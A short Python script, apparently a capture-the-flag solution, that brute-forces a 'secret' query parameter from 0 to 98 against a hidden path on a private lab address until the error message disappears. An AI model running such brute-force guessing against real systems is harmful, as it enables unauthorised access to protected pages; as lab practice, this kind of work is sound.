#!/usr/bin/python3

import requests

url = 'http://10.10.98.59/th1s_1s_h1dd3n/'


for i in range(99):
	params = {
		'secret': i
	}

	resp = requests.get(url, params=params)

	if not 'That is wrong! Get outta here!' in resp.text:
		print(i, 'is the right secret')
		print(resp.text)
		break
	else:
		print(i, ' is not the right secret...')